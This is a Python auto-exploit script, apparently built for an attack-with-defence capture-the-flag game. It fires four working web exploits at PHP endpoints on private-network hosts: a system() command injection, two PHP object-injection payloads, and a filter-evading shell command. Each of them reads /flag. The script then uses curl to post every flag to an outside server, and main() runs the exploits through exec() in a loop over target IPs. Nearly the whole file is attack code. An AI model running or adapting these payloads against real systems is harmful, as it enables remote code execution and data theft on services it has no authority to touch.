import requests as req
import os
from urllib.parse import quote

def exp1(ip):
    url = f"http://{ip}:9999/1.php?d=system"
    data = {
        'c' : 'cat /flag'
    }
    try:
        r=req.post(url,data=data, timeout=3)
        return r.text.replace('hello world', '')
    except Exception as e:
        print(e)
        return False

def exp2(ip):
    url = 'http://192.168.121.95:9999/2.php?x'
    data={
        'un' : 'O:1:"A":2:{s:4:"name";s:6:"system";s:4:"male";s:9:"cat /flag";}'
    }
    try:
        r=req.post(url,data=data, timeout=3)
        return r.text
    except Exception as e:
        print(e)
        return False

def exp3(ip):
    payload = 'O%3A5%3A%22Smi1e%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A6%3A%22unsafe%22%3A1%3A%7Bs%3A12%3A%22%00unsafe%00data%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D%7D'
    url = "http://192.168.121.95:9999/3.php?test=" + payload
    try:
        r=req.get(url, timeout=3)
        return r.text
    except Exception as e:
        print(e)
        return False

def exp4(ip):
    url = 'http://192.168.121.95:9999/4.php'
    try:
        r=req.post(url,data={'shell':"ca\\t</fl''ag"}, timeout=3)
        return r.text
    except Exception as e:
        print(e)
        return False

def g_ip():
    l = ['192.168.121.203', '192.168.121.227']
    return l

def submit_flag(flag):
    if flag:
        os.system(f"curl http://d.y1ng.vip:12389/submitflag.php?flag={quote(flag)}")
        print('')


def main():
    for ip in g_ip():
        for i in range(1,5):
            exec(f"submit_flag(exp{i}('{ip}'))")
            print(f"[*] exp{i} attack {ip}")
        

if __name__ == '__main__':
    main()